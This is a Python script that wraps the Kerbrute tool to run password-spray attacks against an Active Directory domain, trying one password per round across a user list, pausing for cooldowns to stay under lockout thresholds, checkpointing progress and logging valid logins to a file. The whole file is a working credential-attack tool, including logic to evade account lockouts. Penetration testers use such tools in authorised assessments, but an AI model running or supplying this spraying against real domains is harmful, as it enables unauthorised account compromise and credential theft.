"""Kerbrute wrapper with conservative, whole-password checkpoints."""

import argparse
from contextlib import contextmanager
from datetime import datetime, timedelta, timezone
import hashlib
import json
import math
import os
from pathlib import Path
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import time

SESSION_VERSION = 2
ANSI = re.compile(r"\x1b\[[0-?]*[ -/]*[@-~]")
LOG_PREFIX = re.compile(r"^\d{4}/\d{2}/\d{2} \d{2}:\d{2}:\d{2} >\s+")
NEGATIVE_RESULT = re.compile(
    r"^\[!\] .+ - (?:Invalid password|User does not exist|"
    r"Got AS-REP \(no pre-auth\) but couldn't decrypt - bad password)$"
)
SUMMARY = re.compile(
    r"^(?:\d{4}/\d{2}/\d{2} \d{2}:\d{2}:\d{2} >\s+)?"
    r"Done! Tested (\d+) logins \(\d+ successes\) in [\d.]+ seconds$"
)
LOG_LINES = re.compile(r"Using KDC|VALID LOGIN|Done!|AS-REP")


class SessionError(Exception):
    """A checkpoint or input cannot safely be used."""


class StopRequested(KeyboardInterrupt):
    def __init__(self, signum):
        self.signum = signum


class StopSignals:
    def __init__(self):
        self.pending = None
        self.raised = False
        self.deferred = 0

    def check(self):
        if self.pending is not None and not self.raised and not self.deferred:
            self.raised = True
            raise StopRequested(self.pending)

    def handle(self, signum, frame):
        if self.pending is None:
            self.pending = signum
        self.check()

    @contextmanager
    def protect(self):
        self.deferred += 1
        try:
            yield
        finally:
            self.deferred -= 1
            self.check()

    @contextmanager
    def interruptible(self):
        try:
            self.deferred -= 1
            self.check()
            yield
        finally:
            self.deferred += 1


@contextmanager
def termination_signals():
    """Catch normal terminal/supervisor stops so the child is reaped first."""
    previous = {}
    stop = StopSignals()

    try:
        for name in ("SIGINT", "SIGTERM", "SIGHUP"):
            if hasattr(signal, name):
                signum = getattr(signal, name)
                previous[signum] = signal.signal(signum, stop.handle)
        yield stop
    finally:
        for signum, handler in previous.items():
            signal.signal(signum, handler)


def utc_now():
    return datetime.now(timezone.utc)


def build_parser():
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("--users", help="Path to username list.")
    parser.add_argument("--passwords", help="Path to password list.")
    parser.add_argument("--sleep", type=int, default=120, help="Cooldown in minutes; must be positive.")
    parser.add_argument("--domain", help="Domain name.")
    parser.add_argument("--domain-ip", default="", help="Domain controller IP address.")
    parser.add_argument("--pwd-line", type=int, default=0, help="Zero-based starting password index for a new session.")
    parser.add_argument("--user-line", type=int, default=0, help="Only 0 is supported; partial user resumes are unsafe.")
    parser.add_argument("--attempts", type=int, default=1, help="Completed password rounds before cooldown; must be positive.")
    parser.add_argument("--session-file", default=".passwordspray_session", help="Session checkpoint path.")
    parser.add_argument("--log-file", default=".passwordspray.log", help="Sensitive success log path.")
    return parser


def digest(value):
    return hashlib.sha256(json.dumps(value, ensure_ascii=True).encode("utf-8")).hexdigest()


def parse_time(value):
    try:
        result = datetime.fromisoformat(value)
        if result.tzinfo is None or result.utcoffset() is None:
            raise ValueError("Missing time zone")
        return result
    except (TypeError, ValueError) as error:
        raise SessionError("Invalid checkpoint timestamp; manual review is required.") from error


def validate_session(state):
    if not isinstance(state, dict) or state.get("version") != SESSION_VERSION:
        raise SessionError(
            "Legacy or unrecognized checkpoint. Its partial progress and cooldown "
            "cannot be trusted; reconcile it manually before starting a new session."
        )
    for key in ("users", "passwords", "domain", "log_file", "users_hash", "passwords_hash"):
        if not isinstance(state.get(key), str) or not state[key]:
            raise SessionError(f"Missing or invalid checkpoint field: {key}")
    if not isinstance(state.get("domain_ip"), str):
        raise SessionError("Invalid checkpoint field: domain_ip")
    for key, minimum in (("sleep", 1), ("attempts", 1), ("pwd_line", 0), ("password_count", 1)):
        if type(state.get(key)) is not int or state[key] < minimum:
            raise SessionError(f"Invalid checkpoint field: {key}")
    if (type(state.get("user_line")) is not int or state["user_line"] != 0
            or not isinstance(state.get("status"), str) or state["status"] not in {
        "ready", "in_progress", "interrupted", "failed"
    }):
        raise SessionError("Checkpoint has unsafe or unknown progress; manual review is required.")
    if state["pwd_line"] > state["password_count"]:
        raise SessionError("Checkpoint password index exceeds the recorded password list.")
    if "last_sprayed" not in state:
        raise SessionError("Checkpoint is missing its cooldown timestamp.")
    if state["last_sprayed"] is not None:
        parse_time(state["last_sprayed"])
    elif state["pwd_line"] > 0 or state["status"] != "ready":
        raise SessionError("Checkpoint is missing its cooldown timestamp.")
    if state["status"] != "ready":
        raise SessionError(
            f"Checkpoint is {state['status']} at password index {state['pwd_line']}. "
            "An interrupted or failed round may contain unreported in-flight attempts. "
            "Automatic resume is blocked; reconcile the run and cooldown manually."
        )


def save_session(path, state):
    """Replace atomically; a crash leaves either the old or the new checkpoint."""
    path = Path(path)
    temporary = None
    try:
        with tempfile.NamedTemporaryFile(
            mode="w", encoding="utf-8", dir=path.parent, prefix=".session-", delete=False
        ) as stream:
            temporary = stream.name
            json.dump(state, stream, indent=2)
            stream.write("\n")
            stream.flush()
            os.fsync(stream.fileno())
        os.replace(temporary, path)
        temporary = None
        # Persist the rename as well as the contents on supported POSIX filesystems.
        if hasattr(os, "O_DIRECTORY"):
            directory = os.open(path.parent, os.O_RDONLY | os.O_DIRECTORY)
            try:
                os.fsync(directory)
            finally:
                os.close(directory)
    finally:
        if temporary is not None:
            os.unlink(temporary)


@contextmanager
def session_lock(path):
    """A stable sidecar lock protects an atomically replaced checkpoint (POSIX)."""
    try:
        import fcntl
    except ImportError as error:
        raise SessionError("Session locking requires a POSIX platform.") from error
    descriptor = os.open(str(path) + ".lock", os.O_CREAT | os.O_RDWR, 0o600)
    try:
        try:
            fcntl.flock(descriptor, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except BlockingIOError as error:
            raise SessionError("Another process is already using this session file.") from error
        yield
    finally:
        os.close(descriptor)
    # Do not unlink: another process could hold the inode while a new lock is created.


def read_inputs(state, check_hashes=True):
    users = Path(state["users"]).read_text(encoding="utf-8")
    user_lines = users.splitlines()
    if not user_lines or any(not line.strip() for line in user_lines):
        raise SessionError("The user list must be nonempty and contain no blank lines.")
    accounts = set()
    for line in user_lines:
        # Kerbrute discards the @realm suffix; duplicates would repeat an account
        # within one nominal round and defeat the configured attempt budget.
        account = line.split("@", 1)[0].casefold()
        if line != line.strip() or line.count("@") > 1 or not account:
            raise SessionError("The user list contains a malformed or padded account name.")
        if account in accounts:
            raise SessionError("The user list repeats an account; refusing repeated attempts in one round.")
        accounts.add(account)
    with open(state["passwords"], encoding="utf-8") as stream:
        passwords = [line.rstrip("\r\n") for line in stream]
    if not passwords or any(not password for password in passwords):
        raise SessionError("The password list must be nonempty and contain no empty lines.")
    if check_hashes:
        if digest(users) != state["users_hash"]:
            raise SessionError("The user list changed; refusing to reuse this checkpoint.")
        count = state["password_count"]
        if len(passwords) < count or digest(passwords[:count]) != state["passwords_hash"]:
            raise SessionError("The password list was changed or reordered; only appending is supported.")
    if not 0 <= state["pwd_line"] <= len(passwords):
        raise SessionError("Password index is outside the password list.")
    return users, passwords


def check_paths(session_path, state):
    paths = [Path(path).resolve() for path in (
        session_path, str(session_path) + ".lock", state["users"], state["passwords"], state["log_file"]
    )]
    if len(set(paths)) != len(paths):
        raise SessionError("Input, session, lock, and log paths must be different.")
    for index, path in enumerate(paths):
        for other in paths[index + 1:]:
            if path.exists() and other.exists() and os.path.samefile(path, other):
                raise SessionError("Input, session, lock, and log paths must not be hard links to each other.")


def wait_for_cooldown(state):
    if state["last_sprayed"] is None:
        return
    safe_at = parse_time(state["last_sprayed"]) + timedelta(minutes=state["sleep"])
    remaining = max(0.0, (safe_at - utc_now()).total_seconds())
    deadline = time.monotonic() + remaining
    while remaining > 0:
        minutes, seconds = divmod(math.ceil(remaining), 60)
        print(f"\rTime remaining before next round: {minutes:02d}:{seconds:02d}", end="", flush=True)
        time.sleep(min(1.0, remaining))
        remaining = max(0.0, deadline - time.monotonic())
    if deadline > time.monotonic() - 1:
        print()


def stop_process(process):
    if process.poll() is not None:
        return
    try:
        process.terminate()
    except ProcessLookupError:
        pass
    try:
        process.wait(timeout=5)
    except (subprocess.TimeoutExpired, KeyboardInterrupt):
        process.kill()
        process.wait()


def run_round(kerbrute_path, state, users_path, password, total_users, log, stop):
    command = [kerbrute_path, "passwordspray", "--verbose", "-d", state["domain"]]
    if state["domain_ip"]:
        command.extend(["--dc", state["domain_ip"]])
    # End option parsing: a password beginning with '-' must remain a password.
    command.extend(["--", users_path, password])
    process = None
    summary_count = None
    outcome_count = 0
    last_line = ""
    with stop.protect():
        try:
            process = subprocess.Popen(
                command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                start_new_session=True,
            )
            with stop.interruptible():
                for raw_line in process.stdout:
                    line = ANSI.sub("", raw_line.rstrip("\r\n"))
                    print(line, flush=True)
                    message = LOG_PREFIX.sub("", line)
                    if LOG_LINES.search(line):
                        log.write(line + "\n")
                        log.flush()
                    if message.startswith("[!]"):
                        if not NEGATIVE_RESULT.fullmatch(message):
                            if not LOG_LINES.search(line):
                                log.write(line + "\n")
                                log.flush()
                            raise SessionError("Kerbrute reported a lockout or unrecognized error; stopping this round.")
                        outcome_count += 1
                    elif message.startswith("[+] VALID LOGIN:"):
                        outcome_count += 1
                    elif message.startswith("[+] VALID LOGIN WITH ERROR:"):
                        raise SessionError("Kerbrute reported a login error; stopping for manual review.")
                    if line.strip():
                        last_line = line
                    summary = SUMMARY.fullmatch(line)
                    if summary:
                        summary_count = int(summary.group(1))
                return_code = process.wait()
                if return_code != 0:
                    raise SessionError(f"Kerbrute exited with status {return_code}; progress was not advanced.")
                if (summary_count != total_users or outcome_count != total_users
                        or SUMMARY.fullmatch(last_line) is None):
                    raise SessionError("Kerbrute did not confirm a complete round; progress was not advanced.")
        finally:
            if process is not None:
                try:
                    stop_process(process)
                finally:
                    process.stdout.close()


def run(args, stop):
    session_path = Path(args.session_file).resolve()
    if args.user_line != 0:
        raise SessionError("--user-line must be 0. Concurrent output is not a safe file offset.")
    if args.sleep <= 0 or args.attempts <= 0 or args.pwd_line < 0:
        raise SessionError("--sleep and --attempts must be positive; --pwd-line must be nonnegative.")

    with session_lock(session_path):
        if session_path.exists():
            try:
                state = json.loads(session_path.read_text(encoding="utf-8"))
            except (ValueError, UnicodeError) as error:
                raise SessionError("Session file is empty, corrupt, or invalid; it was not overwritten.") from error
            validate_session(state)
            check_paths(session_path, state)
            users, passwords = read_inputs(state)
            print(f"Saved session: {state['domain']}, next password index {state['pwd_line']}.")
            while True:
                choice = input("Resume this session? (Y/n): ").strip().lower()
                if choice in {"", "y"}:
                    break
                if choice == "n":
                    return 0
                print("Enter 'y' or 'n'.")
            # Restarts always honor the remaining cooldown, even between batch rounds.
            wait_for_cooldown(state)
        else:
            if not all((args.users, args.passwords, args.domain)):
                raise SessionError("New sessions require --users, --passwords, and --domain.")
            state = {
                "version": SESSION_VERSION, "status": "ready",
                "users": str(Path(args.users).resolve()),
                "passwords": str(Path(args.passwords).resolve()),
                "log_file": str(Path(args.log_file).resolve()),
                "sleep": args.sleep, "attempts": args.attempts,
                "domain": args.domain, "domain_ip": args.domain_ip,
                "pwd_line": args.pwd_line, "user_line": 0,
                "last_sprayed": None,
            }
            check_paths(session_path, state)
            users, passwords = read_inputs(state, check_hashes=False)
            state.update(users_hash=digest(users), password_count=len(passwords), passwords_hash=digest(passwords))

        kerbrute_path = shutil.which("kerbrute")
        if not kerbrute_path or not os.access(kerbrute_path, os.X_OK):
            raise SessionError("Kerbrute is not installed or executable; no round was started.")

        rounds_since_wait = 0
        while state["pwd_line"] < len(passwords):
            # Revalidate after a wait and before every launch. Only append-only changes are allowed.
            users, passwords = read_inputs(state)
            state.update(password_count=len(passwords), passwords_hash=digest(passwords))
            with tempfile.NamedTemporaryFile(mode="w", encoding="utf-8") as user_snapshot:
                user_snapshot.write(users)
                user_snapshot.flush()
                descriptor = os.open(state["log_file"], os.O_WRONLY | os.O_APPEND | os.O_CREAT, 0o600)
                with os.fdopen(descriptor, "a", encoding="utf-8") as log:
                    os.fchmod(log.fileno(), 0o600)
                    log.write(f"--- Password index: {state['pwd_line']} ---\n")
                    log.flush()
                    # Durable intent BEFORE Popen covers abrupt death and spawn/stream failures.
                    state.update(status="in_progress", last_sprayed=utc_now().isoformat())
                    save_session(session_path, state)
                    try:
                        run_round(kerbrute_path, state, user_snapshot.name,
                                  passwords[state["pwd_line"]], len(users.splitlines()), log, stop)
                    except BaseException as error:
                        # run_round reaps its child first. Never backdate the cooldown.
                        state.update(status="interrupted" if isinstance(error, KeyboardInterrupt) else "failed",
                                     last_sprayed=utc_now().isoformat())
                        save_session(session_path, state)
                        raise
                    state.update(status="ready", pwd_line=state["pwd_line"] + 1,
                                 last_sprayed=utc_now().isoformat())
                    save_session(session_path, state)
            print(f"Completed password round {state['pwd_line']}/{len(passwords)}.", flush=True)
            rounds_since_wait += 1
            if rounds_since_wait >= state["attempts"]:
                wait_for_cooldown(state)
                rounds_since_wait = 0
                users, passwords = read_inputs(state)
        print("All recorded password rounds are complete.")
        return 0


def main(argv=None):
    args = build_parser().parse_args(argv)
    try:
        with termination_signals() as stop:
            return run(args, stop)
    except KeyboardInterrupt as error:
        print("\nInterrupted. The checkpoint is preserved; partial rounds cannot automatically resume.", file=sys.stderr)
        return 128 + getattr(error, "signum", signal.SIGINT)
    except (SessionError, OSError, ValueError, OverflowError, EOFError) as error:
        print(f"Error: {error}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
